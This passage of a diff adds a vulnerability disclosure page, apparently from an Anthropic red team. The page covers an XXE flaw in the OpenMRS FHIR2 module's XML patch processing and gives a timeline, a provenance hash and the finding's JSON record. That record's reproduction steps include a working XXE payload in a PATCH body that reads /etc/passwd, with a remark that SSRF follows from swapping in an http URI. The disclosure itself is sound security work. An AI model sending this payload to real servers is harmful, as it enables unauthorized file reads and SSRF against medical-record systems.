+<span class="diff-a">+			t.setOutputProperty(OutputKeys.OMIT_XML_DECLARATION, &quot;no&quot;);</span>
+<span class="diff-a">+			t.transform(new DOMSource(doc), new StreamResult(out));</span>
+<span class="diff-a">+		}</span>
+<span class="diff-a">+		catch (TransformerException e) {</span>
+<span class="diff-a">+			throw new XmlPatchException(&quot;Failed to serialize XML: &quot; + e.getMessage(), e);</span>
+<span class="diff-a">+		}</span>
+<span class="diff-a">+	}</span>
+<span class="diff-a">+	</span>
+<span class="diff-a">+	private static void trySetAttribute(TransformerFactory tf, String n</span>
+<span class="diff-c">… (truncated)</span></code></pre></div>
+<p class="kicker"><a href="https://github.com/openmrs/openmrs-module-fhir2/commit/601800edad0ab469af1e4bc9758dba1a732472d2" rel="noopener noreferrer">https://github.com/openmrs/openmrs-module-fhir2/commit/601800edad0ab469af1e4bc9758dba1a732472d2</a></p>
+
+
+
+<div class="marker">TIMELINE</div>
+<p class="section-intro">Recorded dates, in order.</p>
+<div class="figure">
+  <ol class="timeline">
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-04-16</span>
+      <span class="timeline-label">Discovered or logged</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-04-27</span>
+      <span class="timeline-label">Sent to maintainer</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-05-09</span>
+      <span class="timeline-label">Maintainer acknowledged</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-06-03</span>
+      <span class="timeline-label">Patch released</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-07-14</span>
+      <span class="timeline-label">Publicly revealed</span>
+    </li>
+  </ol>
+</div>
+
+<div class="marker">PROVENANCE</div>
+<p class="kicker">SHA-3-512 hash:</p>
+<p class="hash full">88a8d86f8ed597f3af03346cf7f89f5506a12871ad029d75f0ccde81f60aa14f850431b25317bd2fd2a2c72440b83485a273a237a7b258cb5f723c5f96b61076</p>
+<p class="kicker">Committed 2026-05-07 07:08 UTC</p>
+<p class="kicker">Revealed 2026-07-14 02:25 UTC</p>
+<p class="kicker">
+  <a download="ANT-2026-CVX8213H-preimage.json"
+     href="data:application/json;charset=utf-8,%7B%22ant_id%22%3A%22ANT-2026-CVX8213H%22%2C%22bug_class%22%3A%22Deserialization%20/%20XXE%22%2C%22claude_severity%22%3A%22high%22%2C%22commit_sha%22%3A%2259474d3db4b93f7f%22%2C%22created_at%22%3A%222026-04-17T05%3A25%3A57%2B00%3A00%22%2C%22description%22%3A%22HTTP%20PATCH%20requests%20with%20Content-Type%20application/xml-patch%2Bxml%20flow%20from%20the%20FHIR%20resource%20provider%20through%20BaseFhirService.patch%28%29%20%28lines%20185-186%2C%20PatchTypeEnum.XML_PATCH%29%20into%20XmlPatchUtils.applyXmlPatch%28%29%2C%20which%20hands%20the%20raw%20body%20to%20com.github.dnault%3Axml-patch%3A0.3.1%27s%20Patcher.patch%28%29.%20That%20library%20instantiates%20DocumentBuilderFactory%20with%20default%20settings%20and%20never%20disables%20DTDs%20or%20external%20entities%2C%20and%20no%20upstream%20filter%20strips%20DOCTYPE%20declarations.%20An%20authenticated%20attacker%20can%20therefore%20embed%20an%20external%20entity%20%28file%3A//%20or%20http%3A//%29%20in%20the%20patch%20XML%20and%20have%20it%20resolved%20server-side.%20The%20resolved%20content%20is%20written%20into%20the%20patched%20FHIR%20resource%20and%20reflected%20back%20in%20the%20response%20or%20error%2C%20yielding%20arbitrary%20file%20read%20and%20SSRF.%22%2C%22discovered_at%22%3A%222026-04-16T00%3A00%3A00%2B00%3A00%22%2C%22location%22%3A%22XmlPatchUtils.java%3A43%22%2C%22poc_sha256%22%3Anull%2C%22preimage_version%22%3A1%2C%22project%22%3A%22openmrs-module-fhir2%22%2C%22reproduction%22%3A%5B%221.%20Authenticate%20to%20the%20OpenMRS%20FHIR2%20endpoint.%22%2C%222.%20Send%20PATCH%20/ws/fhir2/R4/Patient/%7Bid%7D%20with%20Content-Type%3A%20application/xml-patch%2Bxml.%22%2C%223.%20Supply%20body%3A%20%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%5C%22file%3A///etc/passwd%5C%22%3E%5D%3E%3Cdiff%20xmlns%3D%5C%22urn%3Aietf%3Aparams%3Axml%3Ans%3Apatch-ops-error%5C%22%3E%3Creplace%20sel%3D%5C%22/Patient/name/family/text%28%29%5C%22%3E%3Ctext%3E%26xxe%3B%3C/text%3E%3C/replace%3E%3C/diff%3E.%22%2C%224.%20The%20xml-patch%20parser%20resolves%20%26xxe%3B%20and%20injects%20the%20file%20contents%20into%20the%20patched%20resource.%22%2C%225.%20Read%20the%20exfiltrated%20data%20from%20the%20FHIR%20response%20body%20or%20error%20message%3B%20substitute%20http%28s%29%3A//%20URIs%20for%20SSRF.%22%5D%2C%22technical_details%22%3A%22The%20root%20cause%20is%20that%20applyXmlPatch%28%29%20delegates%20parsing%20of%20untrusted%20XML%20to%20a%20third-party%20library%20%28xml-patch%200.3.1%29%20that%20calls%20DocumentBuilderFactory.newInstance%28%29%20without%20setFeature%28%29%20calls%20to%20disable%20external-general-entities%2C%20external-parameter-entities%2C%20or%20DOCTYPE%20declarations.%20Because%20no%20code%20path%20sanitizes%20or%20rejects%20DOCTYPE/ENTITY%20constructs%20before%20parsing%2C%20any%20SYSTEM%20entity%20in%20the%20patch%20body%20is%20resolved%20by%20the%20server%27s%20XML%20parser.%22%2C%22title%22%3A%22XXE%20injection%20via%20XML%20patch%20processing%20in%20third-party%20library%22%2C%22vendor_severity%22%3A%22high%22%7D">Verify (download preimage.json)</a>
+</p>
+<details class="preimage">
+  <summary>Show preimage JSON</summary>
+  <pre class="preimage-body">{
+  &#34;ant_id&#34;: &#34;ANT-2026-CVX8213H&#34;,
+  &#34;bug_class&#34;: &#34;Deserialization / XXE&#34;,
+  &#34;claude_severity&#34;: &#34;high&#34;,
+  &#34;commit_sha&#34;: &#34;59474d3db4b93f7f&#34;,
+  &#34;created_at&#34;: &#34;2026-04-17T05:25:57+00:00&#34;,
+  &#34;description&#34;: &#34;HTTP PATCH requests with Content-Type application/xml-patch+xml flow from the FHIR resource provider through BaseFhirService.patch() (lines 185-186, PatchTypeEnum.XML_PATCH) into XmlPatchUtils.applyXmlPatch(), which hands the raw body to com.github.dnault:xml-patch:0.3.1&#39;s Patcher.patch(). That library instantiates DocumentBuilderFactory with default settings and never disables DTDs or external entities, and no upstream filter strips DOCTYPE declarations. An authenticated attacker can therefore embed an external entity (file:// or http://) in the patch XML and have it resolved server-side. The resolved content is written into the patched FHIR resource and reflected back in the response or error, yielding arbitrary file read and SSRF.&#34;,
+  &#34;discovered_at&#34;: &#34;2026-04-16T00:00:00+00:00&#34;,
+  &#34;location&#34;: &#34;XmlPatchUtils.java:43&#34;,
+  &#34;poc_sha256&#34;: null,
+  &#34;preimage_version&#34;: 1,
+  &#34;project&#34;: &#34;openmrs-module-fhir2&#34;,
+  &#34;reproduction&#34;: [
+    &#34;1. Authenticate to the OpenMRS FHIR2 endpoint.&#34;,
+    &#34;2. Send PATCH /ws/fhir2/R4/Patient/{id} with Content-Type: application/xml-patch+xml.&#34;,
+    &#34;3. Supply body: &lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM \&#34;file:///etc/passwd\&#34;&gt;]&gt;&lt;diff xmlns=\&#34;urn:ietf:params:xml:ns:patch-ops-error\&#34;&gt;&lt;replace sel=\&#34;/Patient/name/family/text()\&#34;&gt;&lt;text&gt;&amp;xxe;&lt;/text&gt;&lt;/replace&gt;&lt;/diff&gt;.&#34;,
+    &#34;4. The xml-patch parser resolves &amp;xxe; and injects the file contents into the patched resource.&#34;,
+    &#34;5. Read the exfiltrated data from the FHIR response body or error message; substitute http(s):// URIs for SSRF.&#34;
+  ],
+  &#34;technical_details&#34;: &#34;The root cause is that applyXmlPatch() delegates parsing of untrusted XML to a third-party library (xml-patch 0.3.1) that calls DocumentBuilderFactory.newInstance() without setFeature() calls to disable external-general-entities, external-parameter-entities, or DOCTYPE declarations. Because no code path sanitizes or rejects DOCTYPE/ENTITY constructs before parsing, any SYSTEM entity in the patch body is resolved by the server&#39;s XML parser.&#34;,
+  &#34;title&#34;: &#34;XXE injection via XML patch processing in third-party library&#34;,
+  &#34;vendor_severity&#34;: &#34;high&#34;
+}</pre>
+</details>
+</main>
+<footer>
+  <p>Anthropic Frontier Red Team</p>
+  <p>Snapshot generated at 2026-11-02 19:30 UTC</p>
+  <p>Dates and times are in UTC</p>
+  <p>Manifest hash <code>25d811e7b56632ef5bbb23eb…</code></p>
+  <p>Archived snapshots remain available at their dated paths so any figure can be verified against the page that was live on that date</p>
+  <p><a href="../data/payload.json">payload.json</a></p>
+</footer>
+<script src="../assets/figures.js" data-root="../"></script>
+<script src="../assets/ledger.js"></script>
+</body>
+</html>
